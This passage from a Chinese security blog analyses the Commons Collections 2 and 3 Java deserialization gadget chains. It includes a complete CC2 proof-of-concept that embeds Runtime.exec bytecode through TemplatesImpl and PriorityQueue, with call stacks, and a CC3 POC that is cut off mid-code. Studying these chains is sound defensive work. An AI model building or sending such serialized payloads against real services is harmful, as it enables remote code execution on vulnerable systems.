<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">114</span>, ChainedTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">796</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1184</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2322</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2213</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1669</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">503</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">461</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">53</span>, commons_collections2 (ysoserial)</span><br></pre></td></tr></table></figure>

<p>此次POC1中每一部分的由来都解释清楚</p>
<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);<span class="comment">//使用TransformingComparator修饰器传入transformer对象</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line"></span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br><span class="line"></span><br><span class="line">        Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field3.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="POC2分析"><a href="#POC2分析" class="headerlink" title="POC2分析"></a>POC2分析</h2><p>其实这里使用的链和POC1差不多，关键在于queue中的元素不同</p>
<p>从上往下分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line">payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line">payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br></pre></td></tr></table></figure>

<p>可以理解为动态创建一个类，并且继承AbstractTranslet类</p>
<p><strong>疑问1：为什么需要继承AbstractTranslet类</strong></p>
<p>接着往下分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line"></span><br><span class="line">Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">field.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line">Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br></pre></td></tr></table></figure>

<p>通过反射实例化TemplatesImpl类，并且设置<code>_bytecodes</code>字段值为payload的字节码，并且<code>_name</code>为test</p>
<p><strong>疑问：为什么需要设置_bytecodes和_name</strong></p>
<p>查看TemplatesImpl类中代码并找到<code>_bytecodes</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在for循环<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>中，经过loader.defineClass加载了_bytecodes中的字节码，这正是前面设置_bytecodes的原因</p>
<p>查看调用defineTransletClasses函数的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数应该是根据_class获取对应的实例对象，在第一个if判断中，需要_name不能为null，故需要在POC中随便设置一个_name，在第二个判断中，就会调用defineTransletClasses函数，获取到我们构造的类；在<code> AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>中，会将构造的类实例化，并且强制转换成AbstractTranslet对象，这就解答了疑问1中我们构造的类为什么需要继承AbstractTranslet的原因。</p>
<p>继续寻找调用getTransletInstance的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">                                      _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在newTransformer中调用了getTransletInstance方法，问题就在于如何调用newTransformer方法</p>
<p>POC中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);<span class="comment">//使用TransformingComparator修饰器传入transformer对象</span></span><br></pre></td></tr></table></figure>

<p>使用了InvokerTransformer来调用newTransformer方法，同时使用了TransformingComparator，它的compare方法会调用传入参数的transform方法，这就衔接上了</p>
<p>再查看一边compare方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.transformer即POC中构造的transformer对象，而obj1其实是TemplatesImpl对象，下面部分POC会体现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line"></span><br><span class="line">Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br><span class="line"></span><br><span class="line">Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">field3.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field3.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br></pre></td></tr></table></figure>

<p>上面部分的构造都是为了PriorityQueue这条链做准备，这里与POC1一样，不解释</p>
<p>调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">137</span>, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">796</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1184</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2322</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2213</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1669</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">503</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">461</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">59</span>, commons_collections2 (ysoserial)</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">Java安全之Commons Collections2分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.anquanke.com/post/id/232592">ysoserial CommonsCollections2 详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://xz.aliyun.com/t/10387">通俗易懂的Java Commons Collection 2分析 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://r17a-17.github.io/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3PriorityQueue%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3Gadget%E6%80%BB%E7%BB%93/">反序列化入口PriorityQueue分析及相关Gadget总结 (r17a-17.github.io)</a></p>
<p><a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">Java 反序列化漏洞入门 | Jckling’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections3链</title>
    <url>/2023/01/14/Java-CC3/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>common-collection 3.1版本 jdk1.7版本下的POC复现</p>
<p>在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>存在于包<code>org.apache.commons.collections.functors</code>中</p>
<p>构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">InstantiateTransformer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时需要关注transform函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过反射实例化一个对象</p>
<h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p>存在于包<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>中</p>
<p>其构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>_transformer = (TransformerImpl) templates.newTransformer();</code>调用了TemplatesImpl中newTransformer函数，在CC2链中可以了解到此函数会对我们构造的类进行实例化。现在使用TrAXFilter，就不需要像CC2链中使用InvokerTransformer调用newTransformer函数</p>
<p>当然，不使用InvokerTransformer也无法调用TrAXFilter的构造方法，如果在<strong>面对InvokerTransformer被过滤的情况下</strong>，可以使用另一个transformer，即上面提到的InstantiateTransformer，它能够通过反射实例化一个对象</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>根据前置知识就可以知道，<strong>通过InstantiateTransformer调用TrAXFilter的构造函数，构造函数会调用TemplatesImpl的newTransformer函数从而对构造的类进行实例化</strong></p>
<p>CC3链其实是CC1链和CC2链的结合，下面给出具体POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span 